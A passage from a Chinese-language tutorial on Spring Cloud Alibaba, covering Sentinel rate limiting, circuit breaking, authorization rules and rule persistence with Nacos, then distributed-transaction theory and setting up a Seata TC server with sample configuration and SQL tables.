快速失败、warmup模式，超出的请求应该会直接报错。但是我们看看队列模式的运行结果：\n\n![](https://img.jwt1399.top/img/202210102140744.png)\n\n全部都通过了。再去sentinel查看实时监控的QPS曲线：\n\n![](https://img.jwt1399.top/img/202210102142623.png)\n\nQPS非常平滑，一致保持在10，超出的请求没有被拒绝，而是放入队列。因此**响应时间**（等待时间）会越来越长。当队列满了以后，才会有部分请求失败：\n\n![](https://img.jwt1399.top/img/202210102142008.png)\n\n#### 4.总结\n\n流控效果有哪些？\n\n- 快速失败：QPS超过阈值时，拒绝新的请求\n\n- warm up： QPS超过阈值时，拒绝新的请求；QPS阈值逐渐提升，可以避免冷启动时高并发导致服务宕机。\n\n- 排队等待：请求会进入队列，按照阈值允许的时间间隔依次执行请求；如果请求预期等待时长大于超时时间，直接拒绝\n\n### ❺热点参数限流\n\n> 之前的限流是统计访问某个资源的所有请求，判断是否超过QPS阈值。\n>\n> 而热点参数限流是**分别统计参数值相同的请求**，判断是否超过QPS阈值。\n\n#### 1.全局参数限流\n\n例如，一个根据id查询商品的接口：\n\n![](https://img.jwt1399.top/img/202210102155281.png)\n\n访问/goods/{id}的请求中，id参数值会有变化，热点参数限流会根据参数值分别统计QPS，统计结果：\n\n![](https://img.jwt1399.top/img/202210102155180.png)\n\n当id=1的请求触发阈值被限流时，id≠1的请求不受影响。\n\n配置示例：\n\n![](https://img.jwt1399.top/img/202210102159969.png)\n\n代表的含义是：对hot这个资源的0号参数（第一个参数）做统计，每1秒**相同参数值**的请求数不能超过5\n\n#### 2.热点参数限流\n\n刚才的配置中，对查询商品这个接口的所有商品一视同仁，QPS都限定为5.\n\n而在实际开发中，可能部分商品是热点商品，例如秒杀商品，我们希望这部分商品的QPS限制与其它商品不一样。那就需要配置热点参数限流的高级选项了：\n\n![](https://img.jwt1399.top/img/202210102159086.png)\n\n结合上一个配置，这里的含义是对0号的long类型参数限流，每1秒相同参数的QPS不能超过5，有两个例外：\n\n- 如果参数值是100，则每1秒允许的QPS为10\n\n- 如果参数值是101，则每1秒允许的QPS为15\n\n#### 3.练习\n\n> **需求**：给/order/{orderId}这个资源添加热点参数限流，规则如下：\n>\n> - 默认的热点参数规则是每1秒请求量不超过2\n>\n> - 给102这个参数设置例外：每1秒请求量不超过4\n>\n> - 给103这个参数设置例外：每1秒请求量不超过10\n\n**注意事项**：热点参数限流对默认的SpringMVC资源无效，需要利用`@SentinelResource`注解标记资源\n\n1）标记资源\n\n给order-service中的OrderController中的/order/{orderId}资源添加注解：\n\n![](https://img.jwt1399.top/img/202210102204455.png)\n\n2）热点参数限流规则\n\n访问该接口，可以看到我们标记的hot资源出现了：\n\n![](https://img.jwt1399.top/img/202210102204840.png)\n\n这里不要点击hot后面的按钮，页面有BUG，点击左侧菜单中**热点规则**菜单：\n\n![](https://img.jwt1399.top/img/202210102204515.png)\n\n点击新增，填写表单：\n\n![](https://img.jwt1399.top/img/202210102204647.png)\n\n3）Jmeter测试，选择`热点参数限流 QPS1`：\n\n![image-20210716120754527](../images/SpringCloud-高级篇/image-20210716120754527.png)\n\n包含3个http请求：\n\n| 普通参数，QPS阈值为2                                 | 结果                                                 |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210102208321.png) | ![](https://img.jwt1399.top/img/202210102208371.png) |\n| **例外项，QPS阈值为4**                               | **结果**                                             |\n| ![](https://img.jwt1399.top/img/202210102208534.png) | ![](https://img.jwt1399.top/img/202210102208122.png) |\n| **例外项，QPS阈值为10**                              | **结果**                                             |\n| ![](https://img.jwt1399.top/img/202210102208460.png) | ![](https://img.jwt1399.top/img/202210102208539.png) |\n\n## ③隔离和降级\n\n### ❶Feign整合Sentinel\n\nSpringCloud中，微服务调用都是通过Feign来实现的，因此做客户端保护必须整合Feign和Sentinel。\n\nFeign整合Sentinel的步骤：\n\n- 在application.yml中配置：feign.sentienl.enable=true\n- 给FeignClient编写FallbackFactory并注册为Bean\n- 将FallbackFactory配置到FeignClient\n\n**1）修改配置，开启sentinel功能**\n\n修改OrderService的application.yml文件，开启Feign的Sentinel功能：\n\n```yaml\nfeign:\n  sentinel:\n    enabled: true # 开启feign对sentinel的支持\n```\n\n**2）编写失败降级逻辑**\n\n业务失败后，不能直接报错，而应该返回用户一个友好提示或者默认结果，这个就是失败降级逻辑。有两种方式：\n\n①方式一：FallbackClass，无法对远程调用的异常做处理\n\n②方式二：FallbackFactory，可以对远程调用的异常做处理，我们选择这种\n\n这里我们演示方式二的失败降级处理。\n\n**步骤一**：在feing-api项目中定义类，实现FallbackFactory：\n\n```java\npackage cn.itcast.feign.clients.fallback;\n\n@Slf4j\npublic class UserClientFallbackFactory implements FallbackFactory<UserClient> {\n    @Override\n    public UserClient create(Throwable throwable) {\n        return new UserClient() {\n            @Override\n            public User findById(Long id) {\n                log.error(\"查询用户异常\", throwable);\n                return new User();\n            }\n        };\n    }\n}\n```\n\n**步骤二**：在feing-api项目中的DefaultFeignConfiguration类中将UserClientFallbackFactory注册为一个Bean：\n\n```java\n@Bean\npublic UserClientFallbackFactory userClientFallbackFactory(){\n    return new UserClientFallbackFactory();\n}\n```\n\n**步骤三**：在feing-api项目中的UserClient接口中使用UserClientFallbackFactory：\n\n```java\n@FeignClient(value = \"userservice\", fallbackFactory = UserClientFallbackFactory.class)\npublic interface UserClient {\n\n    @GetMapping(\"/user/{id}\")\n    User findById(@PathVariable(\"id\") Long id);\n}\n```\n\n重启后，访问一次订单查询业务，然后查看sentinel控制台，可以看到新的簇点链路：\n\n![](https://img.jwt1399.top/img/202210121236062.png)\n\n### ❷线程隔离（舱壁模式）\n\n#### 1.两种实现方式\n\n- **线程池隔离**：给每个服务调用业务分配一个线程池，利用线程池本身实现隔离效果\n\n- **信号量隔离**：采用计数器模式，记录业务使用线程数量，达到信号量上限时，禁止新请求(Sentinel默认采用)\n\n\n| 两种实现方式                                         | 各组优缺点                                           |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210121328405.png) | ![](https://img.jwt1399.top/img/202210121328897.png) |\n\n#### 2.sentinel的线程隔离\n\n**用法说明**：\n\n在添加限流规则时，可以选择两种阈值类型：\n\n- QPS：每秒的请求数，在快速入门中已经演示过\n\n- 线程数：该资源能使用的tomcat线程数的最大值。也就是通过限制线程数量，实现**线程隔离**（舱壁模式）。\n\n![](https://img.jwt1399.top/img/202210121340548.png)\n\n\n\n**实例练习：**\n\n> 需求：给 order-service 服务中的UserClient的查询用户接口设置流控规则，线程数不能超过 2。然后利用jmeter测试。\n\n 1）配置隔离规则，选择feign接口后面的流控按钮：\n\n![](https://img.jwt1399.top/img/202210121344508.png)\n\n填写表单：\n\n![](https://img.jwt1399.top/img/202210121344944.png)\n\n2）Jmeter测试，选择`阈值类型-线程数<2`：\n\n![](https://img.jwt1399.top/img/202210121344384.png)\n\n一次发生10个请求，有较大概率并发线程数超过2，而超出的请求会走之前定义的失败降级逻辑。\n\n查看运行结果：\n\n![](https://img.jwt1399.top/img/202210121344849.png)\n\n发现虽然结果都是通过了，不过部分请求得到的响应是降级返回的null信息。\n\n### ❸熔断降级\n\n#### 1.简介\n\n熔断降级是解决雪崩问题的重要手段。其思路是由**断路器**统计服务调用的异常比例、慢请求比例，如果超出阈值则会**熔断**该服务。即拦截访问该服务的一切请求；而当服务恢复时，断路器会放行访问该服务的请求。\n\n断路器控制熔断和放行是通过状态机来完成的：\n\n![](https://img.jwt1399.top/img/202210121349749.png)\n\n状态机包括三个状态：\n\n- closed：关闭状态，断路器放行所有请求，并开始统计异常比例、慢请求比例。超过阈值则切换到open状态\n- open：打开状态，服务调用被**熔断**，访问被熔断服务的请求会被拒绝，快速失败，直接走降级逻辑。Open状态5秒后会进入half-open状态\n- half-open：半开状态，放行一次请求，根据执行结果来判断接下来的操作。\n  - 请求成功：则切换到closed状态\n  - 请求失败：则切换到open状态\n\n断路器熔断策略有三种：慢调用、异常比例、异常数\n\n#### 2.慢调用\n\n> 业务的响应时长（RT）大于指定时长的请求认定为是慢调用请求。\n>\n> 在指定时间内，如果请求数量超过设定的最小数量，慢调用比例大于设定的阈值，则触发熔断。\n\n例如：\n\n![](https://img.jwt1399.top/img/202210121355334.png)\n\n解读：RT超过500ms的调用是慢调用，统计最近10000ms内的请求，如果请求量超过10次，并且慢调用比例不低于0.5，则触发熔断，熔断时长为5秒。然后进入half-open状态，放行一次请求做测试。\n\n**实例练习**\n\n> 需求：给 UserClient的查询用户接口设置降级规则，慢调用的RT阈值为50ms，统计时间为1秒，最小请求数量为5，失败阈值比例为0.4，熔断时长为5\n\n1）设置慢调用\n\n修改user-service中的/user/{id}这个接口的业务。通过休眠模拟一个延迟时间：\n\n![](https://img.jwt1399.top/img/202210121359370.png)\n\n| orderId=101的订单，关联的是id为1的用户，调用时长为60ms | orderId=102的订单，关联的是id为2的用户，调用时长为非常短 |\n| ------------------------------------------------------ | -------------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210121359056.png)   | ![](https://img.jwt1399.top/img/202210121359372.png)     |\n\n2）设置熔断规则，给feign接口设置降级规则：\n\n| ![](https://img.jwt1399.top/img/202210121404112.png) |\n| ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210121404992.png) |\n\n3）测试\n\n在浏览器访问：http://localhost:8088/order/101，快速刷新5次，可以发现：\n\n![](https://img.jwt1399.top/img/202210121411264.png)\n\n触发了熔断，请求时长缩短至5ms，快速失败了，并且走降级逻辑，返回的null\n\n\n\n在浏览器访问：http://localhost:8088/order/102，竟然也被熔断了：\n\n![](https://img.jwt1399.top/img/202210121411138.png)\n\n#### 3.异常比例、异常数\n\n> 统计指定时间内的调用，如果调用次数超过指定请求数，并且出现异常的比例达到设定的比例阈值（或超过指定异常数），则触发熔断。\n\n异常比例设置：\n\n![](https://img.jwt1399.top/img/202210121417504.png)\n\n解读：统计最近1000ms内的请求，如果请求量超过10次，并且异常比例不低于0.4，则触发熔断。\n\n异常数设置：\n\n![](https://img.jwt1399.top/img/202210121417568.png)\n\n解读：统计最近1000ms内的请求，如果请求量超过10次，并且异常数不低于2次，则触发熔断。\n\n**实例练习**\n\n> 需求：给 UserClient的查询用户接口设置降级规则，统计时间为1秒，最小请求数量为5，失败阈值比例为0.4，熔断时长为5s\n\n 1）设置异常请求\n\n首先，修改user-service中的/user/{id}这个接口的业务。手动抛出异常，以触发异常比例的熔断：\n\n![](https://img.jwt1399.top/img/202210121417647.png)\n\n2）设置熔断规则，给feign接口设置降级规则：\n\n| ![](https://img.jwt1399.top/img/202210121417770.png) |\n| ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210121417510.png) |\n\n在5次请求中，只要异常比例超过0.4，也就是有2次以上的异常，就会触发熔断。\n\n3）测试\n\n在浏览器快速访问：http://localhost:8088/order/102，快速刷新5次，触发熔断：\n\n![](https://img.jwt1399.top/img/202210121418855.png)\n\n此时，我们去访问本来应该正常的103：\n\n![](https://img.jwt1399.top/img/202210121418963.png)\n\n## ④授权规则\n\n### ❶简介\n\n授权规则可以对请求方来源做判断和控制。有白名单和黑名单两种方式。\n\n- 白名单：来源（origin）在白名单内的调用者允许访问\n\n- 黑名单：来源（origin）在黑名单内的调用者不允许访问\n\n点击左侧菜单的授权，可以看到授权规则：\n\n![](../images/SpringCloud-高级篇/image-20221013155050038.png)\n\n- 资源名：就是受保护的资源，例如/order/{orderId}\n\n- 流控应用：是来源者的名单，\n  - 如果是勾选白名单，则名单中的来源被许可访问。\n  - 如果是勾选黑名单，则名单中的来源被禁止访问。\n\n比如：我们允许请求从gateway到order-service，不允许浏览器访问order-service，那么白名单中就要填写**网关的来源名称（origin）**\n\n![](https://img.jwt1399.top/img/202210131552378.png)\n\n### ❷如何获取origin\n\nSentinel是通过`RequestOriginParser`这个接口的`parseOrigin`来获取请求的来源的。\n\n```java\npublic interface RequestOriginParser {\n    /**\n     * 从请求request对象中获取origin，获取方式自定义\n     */\n    String parseOrigin(HttpServletRequest request);\n}\n```\n\n这个方法的作用就是从request对象中，获取请求者的origin值并返回。默认情况下，sentinel不管请求者从哪里来，返回值永远是default，也就是说一切请求的来源都被认为是一样的值default。因此，我们需要自定义这个接口的实现，让**不同的请求，返回不同的origin**。\n\n例如order-service服务中，我们定义一个RequestOriginParser的实现类：\n\n```java\npackage cn.itcast.order.sentinel;\n\n@Component\npublic class HeaderOriginParser implements RequestOriginParser {\n    @Override\n    public String parseOrigin(HttpServletRequest request) {\n        // 1.获取请求头\n        String origin = request.getHeader(\"origin\");\n        // 2.非空判断\n        if (StringUtils.isEmpty(origin)) {\n            origin = \"blank\";\n        }\n        return origin;\n    }\n}\n```\n\n### ❸给网关添加请求头\n\n既然获取请求origin的方式是从reques-header中获取origin值，我们必须让**所有从gateway路由到微服务的请求都带上origin头**。这个需要利用之前学习的一个`GatewayFilter`来实现，`AddRequestHeaderGatewayFilter`。\n\n修改gateway服务中的application.yml，添加一个defaultFilter：\n\n```yaml\nspring:\n  cloud:\n    gateway:\n      default-filters:\n        - AddRequestHeader=origin,gateway\n      routes:\n       # ...略\n```\n\n这样从gateway路由的所有请求都会带上origin头，值为gateway。而从其它地方到达微服务的请求则没有这个头。\n\n### ❹配置授权规则\n\n接下来，我们添加一个授权规则，放行origin值为gateway的请求。\n\n| ![](https://img.jwt1399.top/img/202210131558678.png) |\n| ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210131558364.png) |\n\n| 跳过网关访问order-service服务                        | 通过网关访问order-service服务                        |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210131559792.png) | ![](https://img.jwt1399.top/img/202210131559893.png) |\n\n\n\n## ⑤自定义异常结果\n\n> 默认情况下，发生限流、降级、授权拦截时，都会抛出异常到调用方。异常结果都是flow limmiting（限流）。这样不够友好，无法得知是限流还是降级还是授权拦截。\n\n### ❶异常类型\n\n如果要自定义异常时的返回结果，需要实现`BlockExceptionHandler`接口：\n\n```java\npublic interface BlockExceptionHandler {\n    /**\n     * 处理请求被限流、降级、授权拦截时抛出的异常：BlockException\n     */\n    void handle(HttpServletRequest request, HttpServletResponse response, BlockException e) throws Exception;\n}\n```\n\n这个方法有三个参数：\n\n- HttpServletRequest request：request对象\n- HttpServletResponse response：response对象\n- BlockException e：被sentinel拦截时抛出的异常\n\n这里的BlockException包含多个不同的子类：\n\n| **异常**             | **说明**           |\n| -------------------- | ------------------ |\n| FlowException        | 限流异常           |\n| ParamFlowException   | 热点参数限流的异常 |\n| DegradeException     | 降级异常           |\n| AuthorityException   | 授权规则异常       |\n| SystemBlockException | 系统规则异常       |\n\n### ❷异常处理\n\n下面，我们就在order-service定义一个自定义异常处理类：\n\n```java\npackage cn.itcast.order.sentinel;\n\n@Component\npublic class SentinelExceptionHandler implements BlockExceptionHandler {\n    @Override\n    public void handle(HttpServletRequest request, HttpServletResponse response, BlockException e) throws Exception {\n        String msg = \"未知异常\";\n        int status = 429;\n\n        if (e instanceof FlowException) {\n            msg = \"请求被限流了\";\n        } else if (e instanceof ParamFlowException) {\n            msg = \"请求被热点参数限流\";\n        } else if (e instanceof DegradeException) {\n            msg = \"请求被降级了\";\n        } else if (e instanceof AuthorityException) {\n            msg = \"没有权限访问\";\n            status = 401;\n        }\n\n        response.setContentType(\"application/json;charset=utf-8\");\n        response.setStatus(status);\n        response.getWriter().println(\"{\\\"msg\\\": \" + msg + \", \\\"status\\\": \" + status + \"}\");\n    }\n}\n```\n\n重启测试，在不同场景下，会返回不同的异常消息。\n\n| 限流：                                               | 授权拦截：                                           |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210131607851.png) | ![](https://img.jwt1399.top/img/202210131607100.png) |\n\n## ⑥规则持久化\n\n### ❶简介\n\n现在，sentinel的所有规则都是内存存储，重启后所有规则都会丢失。在生产环境下，我们必须确保这些规则的持久化，避免丢失。\n\n规则是否能持久化，取决于规则管理模式，sentinel支持三种规则管理模式：\n\n- 原始模式：Sentinel的默认模式，将规则保存在内存，重启服务会丢失。\n- pull模式\n- push模式\n\n### ❷pull模式\n\npull模式：控制台将配置的规则推送到Sentinel客户端，而客户端会将配置规则保存在本地文件或数据库中。以后会定时去本地文件或数据库中查询，更新本地规则。\n\n![](https://img.jwt1399.top/img/202210131614663.png)\n\n### ❸push模式\n\npush模式：控制台将配置规则推送到远程配置中心，例如Nacos。Sentinel客户端监听Nacos，获取配置变更的推送消息，完成本地配置更新。\n\n<img src=\"https://img.jwt1399.top/img/202210131614311.png\" style=\"zoom: 67%;\" />\n\n> 需求：修改OrderService，让其监听Nacos中的sentinel规则配置。\n\n#### 1.引入依赖\n\n在order-service中引入sentinel监听nacos的依赖：\n\n```xml\n<dependency>\n    <groupId>com.alibaba.csp</groupId>\n    <artifactId>sentinel-datasource-nacos</artifactId>\n</dependency>\n```\n\n#### 2.配置nacos地址\n\n在order-service中的application.yml文件配置nacos地址及监听的配置信息：\n\n```yaml\nspring:\n  cloud:\n    sentinel:\n      datasource:\n        flow:\n          nacos:\n            server-addr: localhost:8848 # nacos地址\n            dataId: orderservice-flow-rules\n            groupId: SENTINEL_GROUP\n            rule-type: flow # 还可以是：degrade、authority、param-flow\n```\n\n#### 3.修改Sentinel-dashboard源码\n\n> SentinelDashboard默认不支持nacos的持久化，需要修改源码。\n\n下载sentinel-dashboard源码包，用IDEA打开\n\n##### 1）修改nacos依赖\n\n在sentinel-dashboard源码的pom文件中，nacos的依赖默认的scope是test，只能在测试时使用，这里要去除\n\n```xml\n<dependency>\n    <groupId>com.alibaba.csp</groupId>\n    <artifactId>sentinel-datasource-nacos</artifactId>\n</dependency>\n```\n\n##### 2）添加nacos支持\n\n在sentinel-dashboard的test包下，已经编写了对nacos的支持，我们需要将其拷贝到main下。\n\n![](https://img.jwt1399.top/img/202210131625772.png)\n\n##### 3）修改nacos地址\n\n然后，还需要修改测试代码中的NacosConfig类：\n\n![](https://img.jwt1399.top/img/202210131628968.png)\n\n修改其中的nacos地址，让其读取application.properties中的配置：\n\n<img src=\"https://img.jwt1399.top/img/202210131628323.png\" style=\"zoom:67%;\" />\n\n在sentinel-dashboard的application.properties中添加nacos地址配置：\n\n```properties\nnacos.addr=localhost:8848\n```\n\n##### 4）配置nacos数据源\n\n另外，还需要修改com.alibaba.csp.sentinel.dashboard.controller.v2包下的FlowControllerV2类：\n\n![](https://img.jwt1399.top/img/202210131629440.png)\n\n让我们添加的Nacos数据源生效：\n\n![](https://img.jwt1399.top/img/202210131629311.png)\n\n##### 5）修改前端页面\n\n接下来，还要修改前端页面，添加一个支持nacos的菜单。\n\n修改src/main/webapp/resources/app/scripts/directives/sidebar/目录下的sidebar.html文件：\n\n![](https://img.jwt1399.top/img/202210131630519.png)\n\n\n\n将其中的这部分注释打开：\n\n![](https://img.jwt1399.top/img/202210131630133.png)\n\n修改其中的文本：\n\n![](https://img.jwt1399.top/img/202210131630652.png)\n\n##### 6）重新编译、打包项目\n\n运行IDEA中的maven插件，编译和打包修改好的Sentinel-Dashboard：\n\n![](https://img.jwt1399.top/img/202210131630645.png)\n\n##### 7）启动\n\n启动方式跟官方一样：\n\n```sh\njava -jar sentinel-dashboard.jar\n```\n\n如果要修改nacos地址，需要添加参数：\n\n```sh\njava -jar -Dnacos.addr=localhost:8848 sentinel-dashboard.jar\n```\n\n# 2.分布式事务\n\n## ➀事务分类\n\n**本地事务**，也就是基于关系型数据库的事务，也称为传统事务。在传统数据库事务中，必须要满足ACID原则：\n\n- 原子性（atomicity）：事务要么全部提交成功，要么全部失败回滚\n\n- 一致性（consistency）：事务的执行不能破坏数据库数据的完整性和一致性\n\n- 隔离性（isolation）：对同一资源操作的事务不能同时发生\n- 持久性（durability）：对数据库做的一切修改将永久保存，不管是否出现故障\n\n**分布式事务**，在分布式系统环境下由不同的服务之间通过网络远程协作完成事务。例如：\n\n- 跨数据源的分布式事务\n- 跨服务的分布式事务\n- 综合情况\n\n**举个🌰：**\n\n例如电商行业中比较常见的下单付款案例，包括：创建新订单、扣减商品库存、从用户账户余额扣除金额\n\n完成上面的操作需要访问三个不同的微服务和三个不同的数据库。\n\n![](../images/SpringCloud-高级篇/image-20221015145400942.png)\n\n订单的创建、库存的扣减、账户扣款在每一个服务和数据库内是一个**本地事务**，可以保证ACID原则。\n\n把三件事情看做一个\"业务\"，要保证所有业务最终状态一致，这就是**分布式系统下的事务**了。此时ACID难以满足，这是分布式事务要解决的问题\n\n## ➁理论基础\n\n### ❶CAP定理\n\n<img src=\"https://img.jwt1399.top/img/202210151459285.png\" style=\"zoom:50%;\" />\n\n1998年，加州大学的计算机科学家 Eric Brewer 提出，分布式系统有三个指标。\n\n- **Consistency（一致性）**：用户访问分布式系统中的任意节点，得到的数据必须一致。\n\n- **Availability（可用性）**：用户访问集群中的任意健康节点，必须能得到响应，而不是超时或拒绝。\n\n- **Partition tolerance （分区容错性）**：因网络故障或其它原因导致分布式系统中的部分节点与其它节点失去连接，形成独立分区时，整个系统也要持续对外提供服务\n\n它们的第一个字母分别是 C、A、P。Eric Brewer 说，分布式系统节点通过网络连接，一定会出现分区问题（P）\n\n当分区出现时，系统的一致性（C）和可用性（A）就无法同时满足。即这**三个指标不可能同时做到**，这个结论就\n\n叫做 **CAP 定理**。\n\n### ❷BASE理论\n\nBASE理论是对CAP的一种解决思路，包含三个思想：\n\n- **Basically Available** **（基本可用）**：分布式系统在出现故障时，允许损失部分可用性，即保证核心可用。\n- **Soft State（软状态）：**在一定时间内，允许出现中间状态，比如临时的不一致状态。\n- **Eventually Consistent（最终一致性）**：虽然无法保证强一致性，但是在软状态结束后，最终达到数据一致。\n\n### ❸解决分布式事务的思路\n\n分布式事务最大的问题是各个子事务的一致性问题，因此可以借鉴CAP定理和BASE理论，有两种解决思路：\n\n- AP模式：各子事务分别执行和提交，允许出现结果不一致，然后采用弥补措施恢复数据即可，实现最终一致。\n\n- CP模式：各子事务执行后互相等待，同时提交和回滚，达成强一致。但事务等待过程中，处于弱可用状态。\n\n## ➂初识Seata\n\n> Seata是 2019 年 1 月份蚂蚁金服和阿里巴巴共同开源的分布式事务解决方案。致力于提供高性能和简单易用的分布式事务服务，为用户打造一站式的分布式解决方案。官网地址：https://seata.io/\n\n### ❶Seata的架构\n\nSeata事务管理中有三个重要的角色：\n\n- **TC (Transaction Coordinator) -** **事务协调者：**维护全局和分支事务的状态，协调全局事务提交或回滚。\n\n- **TM (Transaction Manager) -** **事务管理器：**定义全局事务的范围、开始全局事务、提交或回滚全局事务。\n\n- **RM (Resource Manager) -** **资源管理器：**管理分支事务处理的资源，与TC交谈以注册分支事务和报告分支事务的状态，并驱动分支事务提交或回滚。\n\n![架构图](https://img.jwt1399.top/img/202210151519221.png)\n\nSeata基于上述架构提供了四种不同的分布式事务解决方案：\n\n- XA模式：强一致性分阶段事务模式，牺牲了一定的可用性，无业务侵入\n- AT模式：最终一致的分阶段事务模式，无业务侵入，也是Seata的默认模式\n- TCC模式：最终一致的分阶段事务模式，有业务侵入\n- SAGA模式：长事务模式，有业务侵入\n\n无论哪种方案，都离不开TC，也就是事务的协调者。\n\n### ❷部署TC服务\n\n1.首先我们要下载seata-server包并解压，地址：[下载中心 (seata.io)](https://seata.io/zh-cn/blog/download.html)\n\n2.修改配置：修改conf目录下的registry.conf文件：\n\n```properties\nregistry {\n  # tc服务的注册中心类，这里选择nacos，也可以是eureka、zookeeper等\n  type = \"nacos\"\n\n  nacos {\n    # seata tc 服务注册到 nacos的服务名称，可以自定义\n    application = \"seata-tc-server\"\n    serverAddr = \"127.0.0.1:8848\"\n    group = \"DEFAULT_GROUP\"\n    namespace = \"\"\n    cluster = \"SH\"\n    username = \"nacos\"\n    password = \"nacos\"\n  }\n}\n\nconfig {\n  # 读取tc服务端的配置文件的方式，这里是从nacos配置中心读取，这样如果tc是集群，可以共享配置\n  type = \"nacos\"\n  # 配置nacos地址等信息\n  nacos {\n    serverAddr = \"127.0.0.1:8848\"\n    namespace = \"\"\n    group = \"SEATA_GROUP\"\n    username = \"nacos\"\n    password = \"nacos\"\n    dataId = \"seataServer.properties\"\n  }\n}\n```\n\n3.在nacos添加配置，为了让tc服务的集群可以共享配置，我们选择了nacos作为统一配置中心。因此服务端配置文件seataServer.properties文件需要在nacos中配好。在nacos中新建配置文件seataServer.properties\n\n```properties\n# 数据存储方式，db代表数据库\nstore.mode=db\nstore.db.datasource=druid\nstore.db.dbType=mysql\nstore.db.driverClassName=com.mysql.jdbc.Driver\nstore.db.url=jdbc:mysql://127.0.0.1:3306/seata?useUnicode=true&rewriteBatchedStatements=true\nstore.db.user=root\nstore.db.password=root\nstore.db.minConn=5\nstore.db.maxConn=30\nstore.db.globalTable=global_table\nstore.db.branchTable=branch_table\nstore.db.queryLimit=100\nstore.db.lockTable=lock_table\nstore.db.maxWait=5000\n# 事务、日志等配置\nserver.recovery.committingRetryPeriod=1000\nserver.recovery.asynCommittingRetryPeriod=1000\nserver.recovery.rollbackingRetryPeriod=1000\nserver.recovery.timeoutRetryPeriod=1000\nserver.maxCommitRetryTimeout=-1\nserver.maxRollbackRetryTimeout=-1\nserver.rollbackRetryTimeoutUnlockEnable=false\nserver.undo.logSaveDays=7\nserver.undo.logDeletePeriod=86400000\n\n# 客户端与服务端传输方式\ntransport.serialization=seata\ntransport.compressor=none\n# 关闭metrics功能，提高性能\nmetrics.enabled=false\nmetrics.registryType=compact\nmetrics.exporterList=prometheus\nmetrics.exporterPrometheusPort=9898\n```\n\n4.创建数据库表：tc服务在管理分布式事务时，需要记录事务相关数据到数据库中，你需要提前创建好这些表。\n\n新建一个名为seata的数据库，运行提供的sql文件：这些表主要记录全局事务、分支事务、全局锁信息：\n\n```sql\n\nSET NAMES utf8mb4;\nSET FOREIGN_KEY_CHECKS = 0;\n\n-- ----------------------------\n-- 分支事务表\n-- ----------------------------\nDROP TABLE IF EXISTS `branch_table`;\nCREATE TABLE `branch_table`  (\n  `branch_id` bigint(20) NOT NULL,\n  `xid` varchar(128) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,\n  `transaction_id` bigint(20) NULL DEFAULT NULL,\n  `resource_group_id` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `resource_id` varchar(256) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `branch_type` varchar(8) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `status` tinyint(4) NULL DEFAULT NULL,\n  `client_id` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `application_data` varchar(2000) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `gmt_create` datetime(6) NULL DEFAULT NULL,\n  `gmt_modified` datetime(6) NULL DEFAULT NULL,\n  PRIMARY KEY (`branch_id`) USING BTREE,\n  INDEX `idx_xid`(`xid`) USING BTREE\n) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;\n\n-- ----------------------------\n-- 全局事务表\n-- ----------------------------\nDROP TABLE IF EXISTS `global_table`;\nCREATE TABLE `global_table`  (\n  `xid` varchar(128) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,\n  `transaction_id` bigint(20) NULL DEFAULT NULL,\n  `status` tinyint(4) NOT NULL,\n  `application_id` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `transaction_service_group` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `transaction_name` varchar(128) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `timeout` int(11) NULL DEFAULT NULL,\n  `begin_time` bigint(20) NULL DEFAULT NULL,\n  `application_data` varchar(2000) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `gmt_create` datetime NULL DEFAULT NULL,\n  `gmt_modified` datetime NULL DEFAULT NULL,\n  PRIMARY KEY (`xid`) USING BTREE,\n  INDEX `idx_gmt_modified_status`(`gmt_modified`, `status`) USING BTREE,\n  INDEX `idx_transaction_id`(`transaction_id`) USING BTREE\n) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;\n\nSET FOREIGN_KEY_CHECKS = 1;\n```\n\n5.启动TC服务：进入bin目录，运行其中的`seata-server.sh`即可，启动成功后，seata-server应该已经注册到nacos注册中心了。\n\n打开浏览器，访问nacos地址：http://localhost:8848，然后进入服务列表页面，可以看到seata-tc-server的信息\n\n### ❸微服务集成Seata\n\n我们通过一个案例来演示分布式事务的问题：seata-demo\n\n- 1）创建数据库，名为seata_demo，然后导入提供的seata-demo.sql文件：\n\n- 2）将项目seata-demo导入IDEA\n\n其中：\n\nseata-demo：父工程，负责管理项目依赖\n\n- account-service：账户服务，负责管理用户的资金账户。提供扣减余额的接口\n- storage-service：库存服务，负责管理商品库存。提供扣减库存的接口\n- order-service：订单服务，负责管理订单。创建订单时，需要调用account-service和storage-service\n\n我们以order-service为例来演示，其它两个微服务也都参考order-service的步骤来做，完全一样。\n\n#### 1.引入依赖\n\n首先，在order-service中引入依赖：\n\n```xml\n<!--seata-->\n<dependency>\n    <groupId>com.alibaba.cloud</groupId>\n    <artifactId>spring-cloud-starter-alibaba-seata</artifactId>\n    <exclusions>\n        <!--版本较低，1.3.0，因此排除--> \n        <exclusion>\n            <artifactId>seata-spring-boot-starter</artifactId>\n            <groupId>io.seata</groupId>\n        </exclusion>\n    </exclusions>\n</dependency>\n<dependency>\n    <groupId>io.seata</groupId>\n    <artifactId>seata-spring-boot-starter</artifactId>\n    <!--seata starter 